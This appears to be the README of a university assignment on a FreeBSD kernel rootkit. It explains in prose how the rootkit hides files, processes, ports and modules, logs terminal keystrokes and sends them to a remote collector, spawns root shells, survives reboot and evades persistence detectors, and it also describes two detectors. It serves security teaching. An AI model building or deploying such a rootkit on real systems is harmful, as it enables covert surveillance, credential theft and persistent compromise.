# 6447 Rootkit Assignment

// Clean up later lol

- Kernel / user communication through character devices + ioctl
- Installs and loads kernel modules in install
- Elevates privileges by making use of kernel specific functions
- Spawns a new root shell upon success of running `./elevate`

## Hiding document
1. Hide the names relating to rootkit from `find` and `ls`  by hooking the system call `getdirentries()`
- The hook first calls the genuine `sys_getdirentries()` to get all the raw records bytes.
- The records bytes are then copied into the kernel buffer to start processing.
- The start of the buffer (if not empty) is a valid `struct dirent` sequence of bytes, which is a record. Each record holds its size, and the next record is calculated by adding the record size to the record pointer.
- The records can be hidden by removing from the records buffer. To do that, the bytes of the next records are shifted to the left by `memmove()`, which will overwrite the record needing to be hidden.
- The name of the record is checked in order to determine whether it should be hidden. The hidden name is customized between implementation, depending on the rootkit module name or so.
- After manipulating the records bytes, the bytes are copied back to the user buffer, and the new size is updated.
2. Hide the port being opened for logging and remote reverse shell
- A new system call is introduce to hide the port given in the argument.
- The kernel internal networking list is managed via global variable `V_tcbinfo`, where `ipi_listhead` is the head of a doubly linked list containing active TCP Internet Protocol Control Block's (inpcb)
- Since `V_tcbinfo` is global and accessed via many threads, the global lock of V_tcbinfo is acquired before performing any modification.
- The list is traversed by the macros to find the block with the same local port or foreign port with the port given via argument.
- If the ports match, the block is removed from the list, in order to hide it from being known by the control block.
3. Hide the kernel module installed 
- When a kernel module is imported, it is tracked via a global tail queue of modules and the tail queue of linker files.
- To hide the module, it is necessary to detach the imported module from these list.
- A new system call is added to allow user to detach the module with the name given by the user.
- In the system call, the modules list is traversed and when the module with the name is found, it is removed from the list. The similar is also done with the list of linker files.
- Since these are global kernel data, when accessing it, the required locks are needed to be acquired to maintain the synchronisation.

4. Hide the files when being inspected by `lstat/stat` family
- These are just wrapper functions of the syscall `fstatat`, so only fstatat needs the hooking
- The argument to this syscall contains only 1 argument, which is the name of the file it is getting the information of. Whenever it comes to the filenames that are necessary to hide, the hook now just returns `ENOENT` error, which indicate that there is no file.
- Otherwise, the hook just calls original `fstatat`.

5. Hiding process
- Processes are tracked in a doubly-linked list called `allproc` managed in `proc.h`. The commands that are used to fetch information about processes show the information based on that list of proccesses.
- The entries of the list are of the type `struct proc` to store the details around a process such as pid, p_flag, p_state, etc.
- So to hide the process, firstly, it needs to be removed from the list of processes. The unique key of a process is the pid, so just need to have a loop to go through entries in that list and remove the process that matches the pid.
- For efficiency purpose, the processes are also stored on a hash table named `pidhashbtl`. Even though the process was removed in the main list of processes, when querying information, the hash table is still in use. Therefore, the process also needs to be removed in the hash table of processes.
# CHANGES MADE (JUST TO LET EVERYONE KNOW):
1. REMOVED PRINTING OF MESSAGES FROM INSTALL
2. UPDATED HIDE_KLD COMPILATION 
3. REMOVED UNNECESSARY CHECKS AT BEGINNING (SINCE THE SPEC SAYS IT WILL BE RUN AS ROOT AND IN FREEBSD ANYWAYS)
4. 


# INSTALL
- install script lists commands for installation? like what else is it supposed to do lol
- it checks dependencies such as make, kldload, etc, to make sure they are available before the script is run 
- the rootkit is compiled using freebsd's existing kernel module building mechanism, which produles the kernel module rootkit.ko
- the user programs such as elevate.c are then compiled and installed into /usr/local/bin which allows it to remain available even after reboot
- the user program hide_kld.c is also compiled, and persistence is maintained through /etc/rc.local, which runs this script again after each reboot

# LOG
- three pieces: capture inside the kernel, delivery in a userland daemon, collection on $REMOTE
- CAPTURE (`kernel/log.c`): `sysent[SYS_read]` is patched with `rk_read_hook`, which calls the genuine `read()` first and only then copies the returned bytes in
- the hook keys on descriptor 0, so it sees both kinds of input the assignment asks for: a shell on the physical console reads the tty through stdin, and sshd hands the SSH protocol stream to the login shell through a pty, which that shell also reads through stdin. programs that read stdin through libc (`cat`, `su`, an editor's prompt) are captured the same way
- only terminal reads are recorded. the descriptor is opened with `fget_read()` and kept only when the vnode carries `VV_ISTTY` or is a character device (`v_type == VCHR`, which covers a pty slave even when devfs did not stamp the flag). pipes, sockets and regular files go through the same syscall and are deliberately ignored: `ls | cat`, or the 50 KB of shell variables that `sysrc`/`bsdconfig` pipe into `/bin/sh`, would otherwise flush every keystroke out of the 64 KB ring in one call. `sysctl kern.rootkit.log_pipes=1` restores the old catch-everything behaviour and `kern.rootkit.fd0_debug` reports how the last descriptor was classified (`ftype<<16 | vtype<<8 | istty`) when that decision needs to be checked
- bytes are assembled into lines before they reach the ring: one entry per command, with a single `[t=seconds.micro pid=uid] ` header, instead of one entry per `read()`. this matters because a program's `read()` returns whatever the line discipline has buffered, so raw captures split commands in odd places. `\r` (what a pty actually sends for Enter) and `\n` both end a line, and the `\n` of a CRLF pair is swallowed so Windows-style input does not produce blank entries; a pending partial line is flushed when pid or uid changes and on unload
- optional output capture: `sysent[SYS_write]` can additionally record fd 1/2, disabled by default because one `ls` of a big directory floods the ring with more text than a user types in a minute. enable at runtime with `sysctl kern.rootkit.log_stdout=1`
- the ring is 64 KB and drops the oldest bytes when full, so a burst never leaves a torn line at the front. `sysctl kern.rootkit` shows `bytes`, `entries` and `dropped`, which is how "nothing happened" is told apart from "it overflowed"
- DELIVERY: `/dev/rootkit` exposes the ring through `read()`/`poll()`; `logsrc/sender.c` (installed as `/usr/local/bin/rklog` by `install`) sleeps in `poll()`, reads whatever accumulated, and sends it over TCP to `$REMOTE:9999`
- while the collector is unreachable the sender appends to `/var/log/.rklog.spool` (8 MB, oldest dropped first) and replays it after reconnecting, ahead of newly captured bytes, so the remote log keeps its order. the file is truncated only after every byte in it was handed to the socket, so a crash in between costs a few repeated lines instead of losing them
- reconnects back off from 500 ms to 30 s and re-resolve the host each time, so both `rklog 10.0.2.2` and `rklog collector.example` keep working across address changes
- COLLECTION: `./log <TARGET_IP> [PORT] [LOGFILE] [-f]` on $REMOTE. the wrapper compiles `logsrc/collector.c` with the first C compiler it finds and `exec`s it; the port must match the sender, output is appended to `exfil.log` (rotated to `.1` at 8 MB) and echoed to stdout at the same time
- the collector accepts any peer and only prints a note when the source address differs from `<TARGET_IP>`; `-f` turns that into a refusal. strict matching is not the default because the two machines are not on the same network in the assignment and NAT (QEMU's slirp included) rewrites the peer address, which would silently discard the exfiltrated data
- no socket is created in the kernel on purpose: the tty hook, the ring and the character device are the parts that need kernel privilege, while retry, spool and buffering logic cannot panic the box from userland
- to verify on $TARGET: `kldstat -m rootkit`, `sysctl kern.rootkit`, then type in a real terminal session (the serial console, or `ssh` into the box) and watch `exfil.log` on $REMOTE grow one entry per command. a non-interactive `ssh host 'printf "x\n" | cat'` must produce nothing, which proves the pipe filter works
- do not iterate by `kldunload rootkit`: the UDP listener thread from `rootkit.c` is not stopped on unload and its next return lands in freed module text, so the box panics (`Fatal trap 12 ... current process = kmod_remote_listen`). to test a rebuilt module, copy it to `/boot/modules/rootkit.ko` and reboot instead

# ELEVATE
- elevate is split between a user and kernel program
- since credentials can't be changed within userland, a request to the kernel and subsequent privilege escalation must happen in the kernel file interface.c
- the user program opens a character device and calls ioctl, which sends a request to rk_elevate, which is defined in interface.h
- afterwards, the request is forwarded to the kernel module interface.c, and gets the process associated with the request thread, where it utilises existing freebsd privilege escalation functions to change credentials to root (i.e. 0)
- a lock is used to make sure that the state of the credentials can't be changed while this process is happening
- afterwards, execution is transferred back to the user program where it inherits the credentials that were changed in the kernel, and it closes the device and opens a new root shell



# PERSISTENCE
- persistence is implemented by using freebsd's kernel module kld_list functionality
- kld_list adds the rootkit module to its list of modules loaded upon startup
- a persistence directory and file are installed upon running install and the rootkit is copied to /boot/modules which makes it available even after freebsd is rebooted and the original project directory is removed
- from there, the rootkit kernel module is added to kld_list in /etc/rc.conf using sysrc, and kldload loads the persistence copy 
- finally, on reboot, freebsd will read the list of modules from /boot/modules and load rootkit.ko without having to initialise or run install again, and the rootkit's MOD_LOAD handler will ensure that /dev/rootkit is remade, so no functionality (i.e. log, elevate) is lost
- since hide_kld isn't run again, a new script is added to install to ensure that it will automatically run, which uses /etc/rc.local, allowing for custom commands to be run at the end when booting (this is necessary, because once hide_kld is run, the rootkit kernel module will no longer be visible)
- absolute path is necessary because on reboot, the proejct directory name will disappear. using absolute path will allow the kernel to find it again even while the working directory is unknown

# Syscall hook detection
* The check is performed on a selected set of system calls.
* On each system call, the name and the number of it are taken into account.
* An array of `struct nlist` is initialised with the first element's `n_name` set to "sysent" to fetch the address of sysent (system call table); and the second element's `n_name` set to the name of the syscall function that needs checking.
* To start reading the kernel memory, we need to initialise the kd (of type `kvm_t *`) to the file pointer returned by `kvm_openfiles`.
* `kvm_nlist` is then called with `kd` and `nl` to fetch the data relating to the names set in the `struct nlist` array.
* After calling `kvm_nlist`, the `n_value` of the first element contains the pointer to the `sysent` table. This is then be used to calculate the address of the syscall in the table given the syscall number (which is equivalent to the offset in the table).
* The calculated address is then used to access the entry of the table and copy the value to a local `struct sysent` variable.
* The `n_value` of the second element contains the address of the original syscall function implementation. This value can be used to compare with the `sy_call` in `struct sysent` above. If two values are equal, the syscall function pointer is pointing to its supposed function. Otherwise, the syscall has been hooked

# Pack inside FreeBSD
- tar -xf 6447-rootkit-assignment-main.zip     
-bsdtar reads zip; no -z for zip
- cd 6447-rootkit-assignment-main
- chmod 755 install elevate log remote
- ./create_submission_tarball                  
-writes rootkit.tar with 755 baked into the archive

# Verification before handing it in
- tar -tvf rootkit.tar | grep -E 'install|elevate|log$|remote$'
--all four lines must start with -rwxr-xr-x

- tar -tf rootkit.tar | head -5
--install / elevate / log / remote must be at the top level, not nested in a folder

- ./log 127.0.0.1 9999 /tmp/x.log
--on REMOTE: prints "collector: port 9999, any peer, appending to /tmp/x.log"


# PERSISTENCE CONCEALMENT AND DETECTION
- Changes made:
    - order of installation, because once the rootkit is loaded, the config files are hidden which means that persistence can't be ensured -> move loading to the very end after all config and setup and installation/compilation is completed

- Concealment:
    - Added more concealment to hide persistence artifacts by hooking various syscalls
    - Hooked fstatat, openat and open syscalls, as well as access since the detector for persistence artifacts uses those to directly read config and module files
    - blocked certain files (including rc.local and rootkit.ko) from being able to be opened by any calls

- Detector:
    - Works by first checking known sus paths
    - Scans through startup config files and startup script directories, suspicious commands and boot modules
    - Ignores comments to avoid false positives 
    - Assigns risk points to each discovery, and if total amount of points crosses a threshold of 10, then the detector reports rootkit is found
    - Certain discoveries are very indicative of rootkit existence, so automatically assign them the number of points to reach risk threshold
